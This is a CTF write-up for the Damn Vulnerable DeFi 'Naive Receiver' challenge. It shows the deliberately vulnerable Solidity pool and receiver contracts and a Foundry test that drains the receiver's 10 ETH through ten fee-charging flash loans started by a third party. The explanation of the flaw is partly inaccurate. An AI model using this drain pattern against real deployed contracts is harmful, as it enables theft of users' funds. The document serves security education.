---
title: DamnVulnerableDeFi-2
date: 2023-12-28 10:39:55
tags:
    - Defi
    - DamnVulnerableDefi
categories: 
    - DamnVulnerableDefi
---

```
There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.
```

## Code

`NaiveReceiverLenderPool.sol`：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol";
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol";
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../../lib/solady/src/utils/SafeTransferLib.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == ETH) {
            return address(this).balance;
        }
        return 0;
    }

    function flashFee(address token, uint256) external pure returns (uint256) {
        if (token != ETH) revert UnsupportedCurrency();
        return FIXED_FEE;
    }

    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (token != ETH) revert UnsupportedCurrency();

        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if (receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE) {
            revert RepayFailed();
        }

        return true;
    }

    // Allow deposits of ETH
    receive() external payable {}
}
```

`FlashloanReceiver.sol`:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../lib/solady/src/utils/SafeTransferLib.sol";
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != ETH) revert UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal {}

    // Allow deposits of ETH
    receive() external payable {}
}
```

## Observation
`NaiveReceiverLenderPool.sol`：
The contract is a lending pool that allows flash loans with a fixed fee of 1 ether . which means we need to repay our debt plus 1 ether after doing a flash loan.

Our Goal is to make the users account => 0 ether , so maybe i will try to do ten times flashloan , which can make users account to 0 ether . 

Vuln is in `onFlashLoan` function there is no access control . The first address is assumed.

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        if (token != ETH) revert UnsupportedCurrency();
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }
        _executeActionDuringFlashLoan();
        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```

>The function onFlashLoan is **expected** to be called by the flash loan contract, not the initiator. You should check msg.sender is the flash loan contract inside the onFlashLoan() function because this function is external and anyone can call it.


## Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/2-naive-receiver/FlashLoanReceiver.sol";
import "../../src/2-naive-receiver/NaiveReceiverLenderPool.sol";
import "../../lib/forge-std/src/Test.sol";

contract NaiveReceiverLenderPoolTest is Test {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    uint256 internal constant INITIAL_BALANCE_Pool = 1000 ether;
    uint256 internal constant INITIAL_BALANCE_Receiver = 10 ether;

    function setUp() public {
        pool = new NaiveReceiverLenderPool();
        receiver = new FlashLoanReceiver(address(pool));
        vm.deal(address(pool), INITIAL_BALANCE_Pool);
        vm.deal(address(receiver), INITIAL_BALANCE_Receiver);
    }

    function testAttackFlashLoan() public {
        assertEq(address(pool).balance, INITIAL_BALANCE_Pool);

        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, "0x"
            );
        }
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, INITIAL_BALANCE_Pool + INITIAL_BALANCE_Receiver);
    }
}
```